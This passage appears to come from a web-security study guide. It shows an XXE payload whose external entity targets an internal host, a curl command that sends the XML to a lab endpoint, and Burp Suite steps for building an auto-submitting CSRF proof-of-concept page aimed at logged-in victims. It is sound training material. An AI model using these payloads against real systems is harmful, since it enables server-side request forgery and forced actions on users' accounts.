<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
    
# send the xml file to xml.php
curl -d@/home/student/guide4.xml http://www.sec542.org/guide/xml.php
```
    
Reference
* https://portswigger.net/web-security/xxe
    
<br/>
 
## CSRF 
    
Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform.  Typically the attacker will place the malicious HTML onto a web site that they control, and then induce victims to visit that web site
    
CSRF PoC generator (built into burp suite pro)

  1. Select a vulnerable HTTP request anywhere in Burp Suite Professional (proxy) that you want to test or exploit.
  2. From the right-click context menu, select **Engagement tools > Generate CSRF PoC**
  3. Burp Suite will generate some HTML that will trigger the selected request (minus cookies, which will be added automatically by the victim's browser).
  4. In the top right, click **Options > Include auto-submit script**.  Then at the bottom, click **Regenerate**
  5. Copy the generated HTML into a web page that you are hosting, once the victim navigates to it in a browser that is logged in to the vulnerable web site, and test whether the intended request is issued successfully and the desired action occurs.
 
Reference: https://portswigger.net/burp/documentation/desktop/functions/generate-csrf-poc
